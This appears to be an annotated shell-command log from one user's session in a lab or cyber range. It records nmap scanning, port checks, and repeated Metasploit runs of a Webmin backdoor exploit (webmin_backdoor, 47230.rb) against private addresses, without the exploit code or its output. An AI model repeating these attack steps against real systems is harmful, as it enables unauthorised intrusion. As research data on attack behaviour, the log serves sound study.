User 43 start time 1594797823 end 1594805341
PADDING
PADDING
PADDING
INPUT|43--0|M0 |1594797823|43|nmap 172.18.1.5|OUTPUT
INPUT|43--1|U|1594798390|43|netstat -lpn|OUTPUT
INPUT|43--2|U|1594798436|43|netstat -lpn | grep 10000|OUTPUT
INPUT|43--3|U|1594798746|43|netstat -na|OUTPUT
INPUT|43--4|U|1594799284|43|netstat -sV|OUTPUT
INPUT|43--5|U|1594799506|43|man netstat|OUTPUT
INPUT|43--6|U|1594799990|43|touch webmin.sh|OUTPUT
INPUT|43--7|U|1594799997|43|nano webmin.sh|OUTPUT
INPUT|43--8|A15 |1594800027|43|chmod +x webmin.sh|OUTPUT
INPUT|43--9|U|1594800031|43|./webmin.sh|OUTPUT
INPUT|43--10|U|1594800193|43|perl --version|OUTPUT
INPUT|43--11|U|1594800216|43|ruby --version|OUTPUT
INPUT|43--12|A10 |1594800358|43|ls|OUTPUT
INPUT|43--13|A15 |1594800364|43|chmod +x 47230.rb|OUTPUT
INPUT|43--14|A10 |1594800365|43|ls|OUTPUT
INPUT|43--15|U|1594800368|43|./47230.rb|OUTPUT
INPUT|43--16|U|1594800483|43|./webmin.sh https://localhost:10000|OUTPUT
INPUT|43--17|U|1594800686|43|./webmin.sh 100.100.100.5:10000|OUTPUT
INPUT|43--18|U|1594800691|43|./webmin.sh 100.100.100.5|OUTPUT
INPUT|43--19|U|1594800721|43|./webmin.sh 172.18.1.1:10000|OUTPUT
INPUT|43--20|U|1594800723|43|./webmin.sh 172.18.1.1|OUTPUT
INPUT|43--21|U|1594800756|43|metasploit|OUTPUT
INPUT|43--22|M2 |1594800777|43|msfconsole|OUTPUT
INPUT|43--23|A4 |1594800862|43|use 47230.rb|OUTPUT
INPUT|43--24|A5 |1594800894|43|show targets|OUTPUT
INPUT|43--25|A6 |1594800946|43|set TARGET 0|OUTPUT
INPUT|43--26|M8 |1594800949|43|exploit|OUTPUT
INPUT|43--27|M5 |1594800983|43|show options|OUTPUT
INPUT|43--28|A6 |1594801058|43|set TARGETURI /root/|OUTPUT
INPUT|43--29|U|1594801062|43|show options|OUTPUT
INPUT|43--30|M6 |1594801131|43|set RHOSTS 172.18.1.1|OUTPUT
INPUT|43--31|U|1594801133|43|exploit|OUTPUT
INPUT|43--32|M4 |1594801207|43|use exploit/unix/webapp/webmin_backdoor |OUTPUT
INPUT|43--33|U|1594801211|43|show options|OUTPUT
INPUT|43--34|U|1594801216|43|exploit|OUTPUT
INPUT|43--35|U|1594801243|43|set TARGET 0|OUTPUT
INPUT|43--36|U|1594801246|43|exploit|OUTPUT
INPUT|43--37|U|1594801282|43|set RHOSTS 172.18.1.5|OUTPUT
INPUT|43--38|U|1594801286|43|exploit|OUTPUT
INPUT|43--39|U|1594801352|43|set LHOST 0.0.0.0|OUTPUT
INPUT|43--40|U|1594801358|43|exploit|OUTPUT
INPUT|43--41|U|1594801396|43|show options|OUTPUT
INPUT|43--42|U|1594801426|43|set TARGETURI /root/|OUTPUT
INPUT|43--43|U|1594801430|43|exploit|OUTPUT
INPUT|43--44|U|1594801442|43|set TARGETURI /|OUTPUT
INPUT|43--45|U|1594801445|43|show options|OUTPUT
INPUT|43--46|U|1594801471|43|exploit|OUTPUT
INPUT|43--47|U|1594801493|43|set LHOST 127.0.0.1|OUTPUT
INPUT|43--48|U|1594801499|43|exploit|OUTPUT
INPUT|43--49|U|1594801557|43|ifconfig|OUTPUT
INPUT|43--50|U|1594801625|43|ifconfig|OUTPUT
INPUT|43--51|U|1594801641|43|set LHOST 192.168.131.153|OUTPUT
INPUT|43--52|U|1594801706|43|exploit|OUTPUT
INPUT|43--53|U|1594801989|43|show options|OUTPUT
INPUT|43--54|U|1594802042|43|set LHOST 10.1.135.83|OUTPUT
INPUT|43--55|U|1594802143|43|exploit|OUTPUT
INPUT|43--56|A7 |1594802365|43|check|OUTPUT
INPUT|43--57|U|1594802386|43|show options|OUTPUT
INPUT|43--58|U|1594802442|43|exploit|OUTPUT
INPUT|43--59|U|1594802537|43|netstat -lpn|OUTPUT
INPUT|43--60|U|1594802570|43|clear|OUTPUT
INPUT|43--61|U|1594802573|43|netstat -a|OUTPUT
INPUT|43--62|U|1594802744|43|netstat -na|OUTPUT
INPUT|43--63|U|1594802776|43|netstat -a|OUTPUT
INPUT|43--64|U|1594802785|43|netstat -a|OUTPUT
INPUT|43--65|U|1594802802|43|msfconsole|OUTPUT
INPUT|43--66|U|1594802837|43|use exploit/unix/webapp/webmin_backdoor |OUTPUT
INPUT|43--67|U|1594802842|43|show options|OUTPUT
INPUT|43--68|U|1594802889|43|ifconfig|OUTPUT
INPUT|43--69|U|1594802906|43|set LHOST 10.1.135.83|OUTPUT
INPUT|43--70|U|1594802953|43|netstat -a|OUTPUT
INPUT|43--71|U|1594802979|43|set RHOST 172.168.1.5|OUTPUT
INPUT|43--72|U|1594803000|43|exploit|OUTPUT
INPUT|43--73|U|1594803004|43|show options|OUTPUT
INPUT|43--74|U|1594803010|43|set TARGET 0|OUTPUT
INPUT|43--75|U|1594803020|43|exploit|OUTPUT
